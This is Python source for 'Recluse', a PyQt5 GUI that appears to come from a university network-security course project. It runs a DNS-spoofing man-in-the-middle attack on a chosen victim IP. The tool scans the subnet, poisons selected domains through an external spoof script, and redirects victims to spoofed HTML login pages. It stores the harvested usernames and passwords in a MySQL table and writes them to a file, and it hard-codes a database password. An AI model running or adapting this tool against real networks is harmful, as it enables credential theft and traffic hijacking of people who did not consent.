import sys
from os import system
import subprocess
import re
from datetime import datetime
import shutil
import threading
from queue import Queue
from socket import gethostbyname, getaddrinfo, AF_INET6
from scapy.all import *
import mysql.connector
#from tkinter import filedialog
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from PyQt5.QtWidgets import *

class dns_window(QMainWindow):

    #Constructor
    stop_t = False
    def __init__(self):
        super().__init__()
        self.htmloption = False
        self.running = False
        title = 'Recluse'
        self.q= Queue()
        self.t1 = ""
        self.interface = ""
        self.net = []
        self.Version = "Ubuntu"
        self.hostdict = []
        self.htmloption = True
        self.setWindowTitle(title)
        self.setGeometry(0,0,500,300) #Set window size
        self.center()
        self.baraction()
        self.dnsmenubar()
        self.connectbar()
        self.labels()
        self.buttons()
        self.entryBox()
        self.victimEntryBox()
        self.show()
    def center(self):
        qr = self.frameGeometry() #Get information about the location and size of the window
        cp = QDesktopWidget().availableGeometry().center() #Determine the center position of the host monitor screen
        qr.moveCenter(cp) #Move rectangle position to center
        self.move(qr.topLeft()) #Move window to the rectangle position
    
    ##MenuBar
    def dnsmenubar(self):
        mbar = QMenuBar(self) #Create menu bar object
        self.setMenuBar(mbar) #Add menu bar object to window
        #Create new menu entities, "&Name" so entity is underlined
        filemenu = QMenu("&File",self)
        program = QMenu("&Program",self)
        view = QMenu("&View",self)
        mysqldb = QMenu('&Mysql',self)
        helps = QMenu("&Help",self)
        #Add actions to menu entities
        program.addAction(self.versionaction)
        program.addAction(self.startaction)
        program.addAction(self.stopaction)
        program.addAction(self.exitaction)
        filemenu.addAction(self.uploadaction)
        view.addAction(self.logaction)
        view.addAction(self.sqlaction)
        mysqldb.addAction(self.sqlcredsaction)
        mysqldb.addAction(self.sqlsetupaction)
        mysqldb.addAction(self.sqlresetaction)
        helps.addAction(self.helpaction)
        helps.addAction(self.aboutaction)
        #Add menu entities to menu object
        mbar.addMenu(program)
        mbar.addMenu(filemenu)
        mbar.addMenu(view)
        mbar.addMenu(mysqldb)
        mbar.addMenu(helps)
    def baraction(self):
        #Create action options under the menu entities
        self.startaction = QAction(QIcon("start.png"),"&Start",self)
        self.stopaction = QAction(QIcon("stop.png"), "&Stop",self)
        self.exitaction = QAction("&Exit",self)
        self.versionaction = QAction("&OS Version",self)
        self.uploadaction = QAction("&Upload HTML",self)
        self.logaction = QAction("&View Log",self)
        self.sqlaction = QAction("&View MySql Results",self)
        self.sqlcredsaction = QAction("&Provide DB Info",self)
        self.sqlsetupaction = QAction("&Setup Spoof DB",self)
        self.sqlresetaction = QAction("&Reset Cred. Table",self)
        self.helpaction = QAction("&Help",self)
        self.aboutaction = QAction("&About",self)
    def connectbar(self):
        #Set functions that will be triggered by the action options
        self.versionaction.triggered.connect(self.version)
        self.startaction.triggered.connect(self.start)
        self.stopaction.triggered.connect(self.stop)
        self.exitaction.triggered.connect(self.close)
        self.uploadaction.triggered.connect(self.upload)
        self.logaction.triggered.connect(self.viewlog)
        self.sqlaction.triggered.connect(self.viewsql)
        self.sqlcredsaction.triggered.connect(self.credsql)
        self.sqlsetupaction.triggered.connect(self.setupsql)
        self.sqlresetaction.triggered.connect(self.resetsql)
        self.helpaction.triggered.connect(self.help)
        self.aboutaction.triggered.connect(self.about)
    def start(self):
        self.Start()
    def stop(self):
        self.Stop()
    def version(self):
        #versionmsg = QMessageBox()
        #versionmsg.setWindowTitle('OS Version')
        #versionmsg.setText('Select your operating system')
        #versionmsg.setIcon(QMessageBox.Question)
        #verionmsg.setStandardButtons(QtGui.QMessageBox.Windows10 | QtGui.QMessageBox.Ubuntu)
        Selection = QMessageBox.question(self,'OS Version','Are you using Ubuntu?\nIf using Ubuntu select "Yes"\nIf using Windows select "No"',QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel)
        
        if Selection == QMessageBox.Yes:
            print("Ubuntu")
            self.Version = "Ubuntu"
            infoBox = QMessageBox(self)
            infoBox.setIcon(QMessageBox.Information)
            infoBox.setWindowTitle("Linux Ubuntu Selected")
            infoBox.setText("OS has been set to Ubuntu.")
            infoBox.exec()
        else:
            print("Windows")
            self.Version = "Windows"
            warnBox = QMessageBox(self)
            warnBox.setIcon(QMessageBox.Warning)
            warnBox.setWindowTitle("Windows Warning")
            warnBox.setText("OS has been set to Windows. However, Its recommended that you use Ubuntu, Windows may cause problems.")
            warnBox.exec()

    def upload(self):
        filename = filedialog.askopenfilename() #Open file explorer to find a particular file
        htmldir = os.getcwd() #Returns current directory of program
        if len(filename) > 0:
            shutil.copy(filename,f"{htmldir}/HTMLSpoofs") #Copy HTML/php file to HTMLSpoofs directory
    def viewlog(self):
        pass

    def viewsql(self):
        result = self.mysqltable("V")
        if result == 1:
            resultBox = QMessageBox(self)
            resultBox.setWindowTitle("Results pulled successfully")
            resultBox.setText("Credentials have been pulled. Open Credentials.txt to view results")
            resultBox.exec()
        else:
            resultBox = QMessageBox(self)
            resultBox.setIcon(QMessageBox)
            resultBox.setWindowTitle("Results failed")
            resultBox.setText("Error occurred when pulling results, try again")
            resultBox.exec()

    def credsql(self):
        pass
    def setupsql(self):
        result = self.mysqltable("S")
        if result == 1:
            resultBox = QMessageBox(self)
            resultBox.setWindowTitle("DB setup successful")
            resultBox.setText("DB has been setup for storing info from spoofed HTML pages")
            resultBox.exec()
        else:
            resultBox = QMessageBox(self)
            resultBox.setIcon(QMessageBox)
            resultBox.setWindowTitle("Setup failed")
            resultBox.setText("Error occurred when setting up DB, try again")
            resultBox.exec()

    def resetsql(self):
        result = self.mysqltable("R")
        if result == 1:
            resultBox = QMessageBox(self)
            resultBox.setWindowTitle("Spoof DB reset successfully")
            resultBox.setText("Spoof DB's credentials table has been successfully reset")
            resultBox.exec()
        else:
            resultBox = QMessageBox(self)
            resultBox.setIcon(QMessageBox)
            resultBox.setWindowTitle("Reset failed")
            resultBox.setText("Error occurred when resetting Spoof DB, try again")
            resultBox.exec()

    def help(self):
        helpbox = QMessageBox(self)
        helpbox.setWindowTitle("Help")
        helptext = "Default OS: Ubuntu\n\nRequirements:\nBefore running the GUI run the install.py file using sudo python3 install.py or sudo python install.py This file is required to downloads all dependencies needed for the GUI\n\nSetup for HTTP Spoof:\nGo to Mysql tab in menu to setup/reset Mysql DB and credentials table\nAll spoofed HTML/PHP files and dependencies should be stored in /var/www/<spoof domain> folder\nSet sql DB info/credentials in SqlCredentials.txt and set the victim IP for the MITM in victimIP.txt (only 1 IP)\nInstructions:\nTo run click start, to stop click stop\nTo add domains to poison change the domains.txt file\nTo add domains that redirect to a spoofed HTML change the domainsSpoof.txt file\nMysql credentials table results can be viewed in View menu\n\nThis program must be run with root privileges to function properly"
        helpbox.setText(helptext)
        helpbox.exec()
    def about(self):
        aboutbox = QMessageBox(self)
        aboutbox.setWindowTitle("About")
        abouttext = "A VCU project\nCMSC414 Computer & Network Security\nCreators:\n\nChristian Jones, G Attard"
        aboutbox.setText(abouttext)
        aboutbox.exec()

    #HostIp/MAC
    def netretrieveWindows(self):
        try: 

            ipconfig = subprocess.run(['ipconfig','/all'], stdout=subprocess.PIPE).stdout.decode('utf-8')
            ipconfig_lines = ipconfig.splitlines()
            ipconfig_interface = ipconfig_lines
            ipconfig_lines = [line.replace(" ","") for line in ipconfig_lines if 1==1]
            ipconfig_interface = [line.strip() for line in ipconfig_interface if 1==1]
            search_key = ipconfig_lines[8].split(":")

            found = 0
            x = 0
            MAC = ""
            IP = ""
            Subnet = ""
            iface = ""
            while found == 0:
                if(ipconfig_lines[x] == f'Connection-specificDNSSuffix.:{search_key[1]}'):
                    y = x
                    adapter = ipconfig_interface[x-2]
                    iface = adapter[17:len(adapter)-1]
                    found = 1
                    temp = ipconfig_lines[y:y+22]
                    MAC = temp[2]
                    IP = temp[8]
                    Subnet = temp[9]
                x = x+1

            MACnum = MAC[24:]; MACnum = MACnum.replace(":","")
            IPnum = IP[22:];  IPnum = IPnum.replace(":",""); IPnum = IPnum.replace("(Preferred)","")
            Subnum = Subnet[21:]; Subnum = Subnum.replace(":","")
            if(IP[:11] != "IPv4Address" or Subnet[:10] != "SubnetMask" or len(IPnum) < 4 or len(Subnum) < 4):
                raise Exception("An error occurred, please check your network")

            arptable = subprocess.run(['arp','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
            found = 0
            x = 0
            IPs_MAC = []
            tempARP = []
            while found == 0:
                if(re.match(f'Interface: {IPnum}(.)',arptable[x])):
                    x = x + 2
                    found = 1
                    while arptable[x] != '':
                        temp = arptable[x].split(" ")
                        for line in temp:
                            if(line != ''):
                                if(line == 'dynamic'):
                                    IPs_MAC.append(tempARP[0]); IPs_MAC.append(tempARP[1])
                                    tempARP.clear()
                                elif(line == 'static'):
                                    tempARP.clear()
                                else:
                                    tempARP.append(line)
                        x = x+1
                x = x+1
            IPs_MAC.append(IPnum); IPs_MAC.append(MACnum); IPs_MAC.append(iface)
            return IPs_MAC

        except:
            print("An error occurred, retry or check your network config")

    def netretrieveLinux(self):
        hostname = subprocess.run(['hostname','-I'], stdout=subprocess.PIPE).stdout.decode('utf-8')
        hostname = hostname.split(" ")

        ifconfig_lines = subprocess.run(['ifconfig','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
        ifconfig_lines = [line.strip() for line in ifconfig_lines if 1==1]

        found = 0
        iface = ""
        x = 0
        y = 0
        while found == 0:
            check = ifconfig_lines[x]
            check = check.split(" ")
            aface = re.search("^[a-zA-Z0-9_.-]*:$",check[0])
            if check[0] != "":
                if aface:
                    iface = check[0].replace(":","")
                    y = x

                if(check[1] == hostname[0]):
                    found = 1
            x = x + 1

        subnet = hostname[0][0:9]
        subnetScan = f"{subnet}.0/24"
        scan = subprocess.run(['sudo','nmap','-sn',f'{subnetScan}'], stdout=subprocess.PIPE).stdout.decode('utf-8')
        scan = scan.split('\n')

        IPs_MAC = []
        for x in range(1,len(scan)):
            ip = re.findall('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+',scan[x])
            if len(ip) == 1:
                IPs_MAC.append(ip[0][0:])
            mac = re.findall('[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+',scan[x])
            if len(mac) == 1:
                IPs_MAC.append(mac[0][0:])
        
        IPs_MAC.append(hostname[0]); IPs_MAC.append(hostname[1]); IPs_MAC.append(iface)
        return IPs_MAC

    def IPsMAC(self):
        if self.Version == "Ubuntu":
            IpsMACs = self.netretrieveLinux()
            HostIP_MAC = []
            HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
            self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
            self.hostLabel.setAlignment(Qt.AlignLeft)
            self.hostLabel.resize(200,30)
            self.hostLabel.move(10,30)
            self.lists.clear()
            for x in range(0, len(IpsMACs)-3, 2):
                IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
                self.lists.addItem(IP)
            self.interface = IpsMACs[(len(IpsMACs)-1)]
        elif self.Version == "Windows":
            IpsMACs = self.netretrieveWindows()
            HostIP_MAC = []
            HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
            self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
            self.hostLabel.setAlignment(Qt.AlignLeft)
            self.hostLabel.resize(200,50)
            self.hostLabel.move(10,30)
            self.lists.clear()
            for x in range(0, len(IpsMACs)-3, 2):
                IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
                self.lists.addItem(IP)
            self.interface = IpsMACs[(len(IpsMACs)-1)]
            self.net = IpsMACs
    
    #Mysql
    def mysqltable(self, todo):
        if todo == "S":
            mydb = ""
            try:
                mydb = mysql.connector.connect(
                    host="127.0.0.1",
                    user="debian-sys-maint",
                    password="5EB0SFQgoKH3KZ8p",
                )
            except mysql.connector.Error as err:
                print("Mysql Connection error {}".format(err))


            mycursor = mydb.cursor()
            try:
                mycursor.execute("CREATE DATABASE spoof")
                mycursor.close()
                mydb.close()
            except: 
                print("Spoof database already exist")
            
            try: 
                mydb = mysql.connector.connect(
                    host="127.0.0.1",
                    user="debian-sys-maint",
                    password="5EB0SFQgoKH3KZ8p",
                    database="spoof"
                )
            except mysql.connector.Error as err:
                print("Mysql Connection error {}".format(err))
                return 0

            mycursor = mydb.cursor()
            try:
                mycursor.execute("CREATE TABLE credentials (id INT AUTO_INCREMENT, username varchar(200), password varchar(200), PRIMARY KEY(id))")
                mycursor.close()
                mydb.close()
                return 1
            except:
                print("credentials table already exist")
                return 1

        elif todo == "V":
            mydb = ""
            try: 
                mydb = mysql.connector.connect(
                    host="127.0.0.1",
                    user="debian-sys-maint",
                    password="5EB0SFQgoKH3KZ8p",
                    database="spoof"
                )
            except mysql.connector.Error as err:
                print("Mysql Connection error {}".format(err))
                return 0

            mycursor = mydb.cursor()
            try:
                mycursor.execute("SELECT * FROM credentials")
                result = mycursor.fetchall()
                credFile = open('../Credentials.txt','w')
                credFile.write("ID  |  USER  |  PASS\n____________________\n")
                print("\nID  |  USER  |  PASS")
                print("____________________")
                for x in result:
                    print(f"{x[0]}     {x[1]}   {x[2]}")
                    credFile.write(f"{x[0]}     {x[1]}   {x[2]}\n")
                print("\n")
                credFile.close()
                mycursor.close()
                return 1
            except: 
                print("Something went wrong with the credentials table")
                return 0

        elif todo == "R":
            mydb = ""
            try: 
                mydb = mysql.connector.connect(
                    host="127.0.0.1",
                    user="debian-sys-maint",
                    password="5EB0SFQgoKH3KZ8p",
                    database="spoof"
                )
            except mysql.connector.Error as err:
                print("Mysql Connection error {}".format(err))
                return 0

            mycursor = mydb.cursor()
            try:
                mycursor.execute("TRUNCATE TABLE credentials")
                mycursor.close()
                return 1
            except:
                print("Something went wrong when deleting the table")
                return 0

    #Labels,Buttons&TextBox
    def labels(self):
        self.hostLabel = QLabel(self) #Create Label object
        self.lists = QListWidget(self) #Create list object
        self.lists.setGeometry(30,50,300,135) #Set list size
        self.lists.move(10,100) #Set List position
        self.lists2 = QListWidget(self)
        self.lists2.setGeometry(30,50,300,50)
        self.lists2.move(10,240)
        self.domainLabel = QLabel("Domains to Poison",self)
        self.domainLabel.setAlignment(Qt.AlignCenter)
        self.domainLabel.move(320,70)
        self.domainLabel.resize(125,40)
        self.domainLabel2 = QLabel("HTML to Spoof",self)
        self.domainLabel2.setAlignment(Qt.AlignCenter)
        self.domainLabel2.move(320,190)
        
    def buttons(self):
        self.ipbtn = QPushButton("LocateIPs",self) #Create regular button
        self.ipbtn.clicked.connect(self.IPsMAC)
        self.ipbtn.move(10,60)

        self.start = QPushButton("Start",self)
        self.start.clicked.connect(self.Start)
        self.start.move(110,60)
        self.stop = QPushButton("Stop",self)
        self.stop.clicked.connect(self.Stop)
        self.stop.move(210,60)

        self.dropdown = QComboBox(self) #Dropdown box button
        self.dropdown.addItem("All Domains")
        domains = open('../domains.txt','r')
        urls = domains.readlines()
        d = 0
        for url in urls:
            tobytes = bytes(url.strip(), encoding="utf-8")
            self.hostdict.append(tobytes)
            self.dropdown.addItem(url.strip())
            d = d + 1
        self.dropdown.move(320,100)

        self.spoofHTML = QRadioButton("Spoof HTML",self) #Create bubble select button
        self.dontSpoof = QRadioButton("Dont spoof HTML",self)
        self.spoofHTML.setChecked(True)
        self.spoofHTML.toggled.connect(lambda:self.set_spoof(self.spoofHTML))
        self.dontSpoof.toggled.connect(lambda:self.set_spoof(self.dontSpoof))
        self.spoofHTML.move(320,140)
        self.dontSpoof.move(320,160)

        self.dropdown2 = QComboBox(self)
        self.dropdown2.addItem("None")
        domainSpoof = open('../domainSpoof.txt','r')
        urlSpoof = domainSpoof.readlines()
        for url in urlSpoof:
            self.dropdown2.addItem(url.strip())
        self.dropdown2.move(320,220)
    
    def entryBox(self):
        self.entryLabel = QLabel("Where to redirect",self)
        self.entryLabel.setAlignment(Qt.AlignCenter)
        self.entryLabel.move(320,35)
        self.entryLabel.resize(120,30)
        self.entry = QLineEdit(self)
        self.entry.move(320,60)
        self.entry.resize(100,20)
    
    def victimEntryBox(self):
        self.victimLabel = QLabel("Victim IP for MITM",self)
        self.victimLabel.setAlignment(Qt.AlignCenter)
        self.victimLabel.move(320,245)
        self.victimLabel.resize(125,30)
        self.entryv = QLineEdit(self)
        self.entryv.move(320,270)
        self.entryv.resize(100,20)

    def set_spoof(self,radio):
        if radio.text() == "Spoof HTML":
            if radio.isChecked() == True:
                self.htmloption = True
            else:
                self.htmloption = False

    def poison(self,ip,ipv6,spoof):
        system('sudo resolvectl flush-caches')
        print("Running DNS Spoof")
        system(f'sudo python3 ../DNS_SPOOF/DNS_SPOOF2.py {ip} {spoof}')
        self.Stop()

    def Start(self):
        failed = 0 #Fail Check
        if self.running == False:
            self.running = True
            startbox = QMessageBox(self)
            startbox.setWindowTitle("Start Spoof")
            starttext = "GUI will freeze while running attack do not force close.\nInstead, close spoof attack runnning in terminal with ctrl+c before continuing"
            startbox.setText(starttext)
            startbox.exec()
            if self.Version == "Ubuntu":
                if(self.interface == ""):
                    getface = self.netretrieveLinux()
                    self.interface = getface[len(getface)-1]
                system('sudo resolvectl flush-caches')
                print("DNS Flushed\n")
            elif self.Version == "Windows":
                if(self.interface == ""):
                    getface = self.netretrieveWindows()
                    self.interface = getface[len(getface)-1]
                system('ipconfig /flushdns')
            if self.entry.text() != "": 
                redirect = self.entry.text()
                
                try:
                    self.ip = gethostbyname(redirect)
                    self.ipv6 = "0"
                except:
                    failed =  failed + 1
                    pass
                try:

                    self.ipv6 = getaddrinfo(redirect,None,AF_INET6)[0][4][0]
                except:
                    failed = failed + 1
                    pass

                if failed == 2:
                    warnBox = QMessageBox(self)
                    warnBox.setIcon(QMessageBox.Warning)
                    warnBox.setWindowTitle("Redirect Warning")
                    warnBox.setText("An error occurred for the domain given")
                    warnBox.exec()
                    self.Stop()
                else:
                    spoofUrl = ""
                    if self.htmloption == True:
                        spoofUrl = self.dropdown2.currentText()
                    else:
                        spoofUrl = "None"
                    time = datetime.now()
                    self.lists2.addItem(f"Poisoning has begun {time}")
                    self.poison(self.ip,self.ipv6,spoofUrl)
                    #self.q.put("run")
                    #self.t1 = Thread(target=self.poison, daemon= True)
                    #self.t1.start()
            else:
                warnBox = QMessageBox(self)
                warnBox.setIcon(QMessageBox.Warning)
                warnBox.setWindowTitle("Redirect Warning")
                warnBox.setText("No redirect domain was given")
                warnBox.exec()
                self.Stop()

    def Stop(self):
        if self.running == True:
            self.running = False
            stop_t = True
            time = datetime.now()
            self.lists2.addItem(f"Poisoning has ended {time}")
        if self.t1 != "":
            self.q.put("stop")
            self.t1 = ""
    
    #Error box
    def errorbox(self):
        error = QMessageBox(self)
        error.setWindowTitle("ERROR")
        error.setText("Something went wrong")
        error.exec()

        
    
app = QApplication(sys.argv) #Create new application
window = dns_window() #Create new window object for the gui
sys.exit(app.exec()) #Run application loop to run the gui
